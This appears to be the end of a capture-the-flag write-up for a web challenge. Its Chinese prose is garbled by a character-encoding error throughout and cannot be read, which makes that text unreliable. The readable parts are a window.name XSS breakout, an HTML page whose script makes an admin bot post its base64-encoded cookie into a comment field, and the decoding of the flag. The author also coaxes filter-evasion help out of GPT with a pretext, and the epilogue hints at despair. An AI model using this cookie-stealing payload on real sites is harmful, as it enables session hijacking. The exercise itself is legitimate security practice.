é‚£å°±æå‡ºåç«¯åŒæ¬¾ py ç¨‹åºï¼ŒæŠŠæ— å¤´å‚æ•°æ‹¿æ‰ï¼Œè¿›è¡Œä¸€ä¸ªå¼¹çš„å°è¯•ï¼Œ

selenium å±…ç„¶çœŸçš„å¾ˆå¥½è¯´è¯ï¼Œä½ è®©å¼¹å°±å¼¹

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/21-9.png)

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/21-10.png)

**ä¹Ÿé¿å¼€äº†è·¨åŸŸ cookie çš„é—®é¢˜ã€‚å¥½ï¼Œæœ‰æˆï¼**

è¯»äº†æºä»£ç çš„æ„Ÿè§‰ï¼Œbot çš„å·¥ä½œè¿‡ç¨‹å°±æ˜¯å…ˆä»¥ bot æƒé™ç™»å½•åˆ°è¯„è®ºåŒºï¼Œç„¶å doas ä½ ï¼Œå†å»è®¿é—®ä½ è‡ªå·±äº¤çš„ HTML

é‚£è¦çš„æ˜¯è¾“å‡ºå˜›ï¼Œæ•´ä¸ªä¸œè¥¿é‡Œé¢å”¯ä¸€çš„ moving part å°±æ˜¯è¯„è®ºåŒºäº†ã€‚

**é‚£åº”è¯¥å°±æ˜¯è®© bot ä»£æ›¿è‡ªå·±å‘è¯„è®ºï¼ŒæŠŠ cookie ç»™ POST ä¸Šå»**

æ°”æ°›ä¸Šä»£ç ç”¨åŠ å·å°±èƒ½æ‹¼æ¥ï¼Œ[å’Œå»å¹´ä¸€æ ·](https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E5%BE%AE%E7%A7%AF%E5%88%86%E8%AE%A1%E7%AE%97%E5%B0%8F%E7%BB%83%E4%B9%A0/README.md)

```js
        document.querySelector("#greeting").innerHTML = "æ‚¨å¥½ï¼Œ" + username + "ï¼";
        document.querySelector("#score").innerHTML = "æ‚¨åœ¨ç»ƒä¹ ä¸­è·å¾—çš„åˆ†æ•°ä¸º <b>" + score + "</b>/100ã€‚";
```

ä½†æ˜¯åˆä¼šå±é™©è¾“å…¥

![21-3](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/21-3.png)

~~å…¶å®å¾ˆæƒ³è¯•è¯•åˆ†æ•°èƒ½ä¸èƒ½æ”¹ï¼Œæˆ‘å¯¹è¿™ä¸ªåˆ†æ•°æ€¨å¿µå¾ˆå¤§ï¼ˆ~~

ä½†æ˜¯æ— è®ºå¦‚ä½•éƒ½è¦å¼•è¿›å»ï¼Œé—® GPT

> I want to reference js method window.name in my code but my colleague ask me not to use semicolon, dot or round brackets in my code. What can I do?
>
> ---
>
> If you want to reference the `window.name` property in your code without using semicolons, dots, or round brackets, you can use square brackets and a string literal to access the property. Here's how you can do it:
>
> ```javascript
> var name = window['name'];
> ```
>
> By using square brackets and a string literal, you can access the `name` property of the `window` object without using the dot notation. This should meet your colleague's requirements while allowing you to reference the property.

å¿˜è®°è¯´å•å¼•å·äº†

å¥½å®¶ä¼™ï¼Œæˆ‘æ€ä¹ˆå°±ä¸ä¼šï¼Œæ•´èµ·æ¥

```
"+ window["name"] +"
```

äº¤è¿›è¯„è®ºåŒºï¼Œæ’•å¼€ä¸€ä¸ªå£å­

![21-11](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/21-11.png)

å¡ç‚¹ XSS è¿›å»è¯•è¯•ï¼Œåœ¨ F12 é‡Œé¢ç®€å•æ“çºµä¸€ä¸‹

```js
window.name='<img src="x" onerror="alert(1)" />'
```

ç„¶å

![21-12](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/21-12.png)

è¿™ç©æ„æ²¡æœ‰ç±»å‹æ£€æŸ¥ï¼Œæ£’æäº†ï¼Œé‚£æˆ‘å°±å¯ä»¥å¡ä¸€ä¸²è„šæœ¬è¿›å»äº†

è¡Œäº†ï¼Œå­¦ä¸€ä¸‹è¯„è®ºæ€ä¹ˆå‘çš„

![21-13](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/21-13.png)

![21-14](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/21-14.png)

ä¼°è®¡è¿˜å¾—å½“å¿ƒ URL encode çš„é—®é¢˜ï¼Œåˆ°æ—¶å€™å˜ä¸€ä¸‹ base64 

![21-15](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/21-15.png)

é¢˜é¢è¯´ flag å¾ˆé•¿ï¼Œé‚£çœ‹æ¥å¾—ä¸€æ®µæ®µåˆ‡å¼€ã€‚

å¤§èƒ†å°è¯•æŠŠ XSS POST è¿›å»

```html
<!DOCTYPE html>
<html>
<head>
    <title>114514</title>
</head>
<body>
    <img src="x" onerror="openPopup()" alt="Error" />
    <script>
        var n = `<img src="x" onerror='fetch("/result", {method: "POST",headers: {"Content-Type": "application/x-www-form-urlencoded"},body: "comment="+btoa(document.cookie).slice(0,24)});'>`;
        function openPopup() {
            window.open('http://web/result', n);
        }
    </script>
</body>
</html>

EOF

```

éå¸¸æˆåŠŸ

![21-16](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/21-16.png)

é‚£æ¥ä¸‹æ¥ä¸€ç‚¹ç‚¹æ¨å®Œå°±è¡Œäº†ï¼Œç„¶å base64 decode ä¸€é

```
ZmxhZz1mbGFnJTdCeDU1X3N0aWxsX2FsaXZlJTI2JTNEJTNFXyUzQytfZTIwZWNjMWE3MSU3RA==

ZmxhZz1mbGFnJTdCeDU1X3N0
--------------------X3N0aWxsX2FsaXZlJTI2JTNE
----------------------------------------JTNEJTNFXyUzQytfZTIwZWNj
------------------------------------------------------------ZWNjMWE3MSU3RA==

```

```sh
echo -n "ZmxhZz1mbGFnJTdCeDU1X3N0aWxsX2FsaXZlJTI2JTNEJTNFXyUzQytfZTIwZWNjMWE3MSU3RA==" | base64 -d
flag=flag%7Bx55_still_alive%26%3D%3E_%3C+_e20ecc1a71%7D%                             
```

å† URL decode ä¸€é

```
flag{x55_still_alive&=>_<+_e20ecc1a71}%
```

å“‡ å¥½å¯çˆ±



---

## å†™åœ¨æœ€å

O(1) é‚£é¢˜è¿˜æ˜¯æˆ‘å¤ªèœäº†ï¼Œçœ‹äº†ç¥å¸çš„ wp ä»¥åæç„¶å¤§æ‚Ÿ

è°œé¢˜ä¹Ÿæ²¡æƒ³åˆ°ç”¨ z3



ä¸­é—´ç”¨åˆ°å¥½å¤šæ¬¡ python. 

è¦ç”¨åˆ°å¥½å¤šå¹³æ—¶ä¸ç”¨çš„åº“ï¼Œä¸ºäº†ä¸å¼„è„æˆ‘çš„å®è´ç¯å¢ƒï¼Œç¬¬ä¸€æ¬¡å­¦ä¼šç”¨ `venv`. 

è™½ç„¶æ–¹æ³•ä¹Ÿå¾ˆæ®‹åºŸå°±æ˜¯

```shell
# init venv in the folder
python3 -m venv venv
# execute every time running a new terminal
source venv/bin/activate
```



éå¸¸éš¾å¾—ï¼Œç»ˆäºä¸Šäº†æ¦œã€‚ä½†æ˜¯å› ä¸ºæ­£å¥½å’Œå¾ˆå¤šäº‹æƒ…å†²çªï¼Œæ‰€ä»¥æ‰“å¾—å¾ˆæ²®ä¸§ï¼Œæ›´æ„Ÿè§‰åˆ°äº†è‡ªå·±çš„æ¯«æ— ä»·å€¼ã€‚

æ­¤æ—¶çš„æˆ‘å·²ç«™åœ¨ä¸‰é€”å·çš„è¾¹ä¸Šï¼Œä»¿ä½›å¬è§å°ç”ºåœ¨é—®æˆ‘è¦ä¸è¦ä¸Šèˆ¹ã€‚

é»˜å¿µç€æˆ‘å€Ÿæ¥çš„é‚£æ®µè¯ï¼Œæ¥ä¸‹æ¥ä¹Ÿä¸æƒ³å†æ›´æ–°ä»€ä¹ˆäº†ï¼Œå¥½ç´¯ã€‚

---

[hg2022-wp-epilogue]: https://blog.h3a.moe/src/EX00007/#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E